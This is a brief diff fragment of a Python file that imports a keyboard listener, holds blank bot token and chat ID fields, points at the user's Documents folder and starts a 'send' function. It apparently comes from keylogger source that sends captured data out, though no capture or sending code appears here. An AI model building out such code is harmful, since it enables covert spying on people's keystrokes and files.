@@ -7,7 +7,6 @@ from pynput import keyboard
 
 token = ''
 chatID = ''
-mainstr = ''
 path = f'C:/Users/{getpass.getuser()}/Documents'
 
 def send(filename):
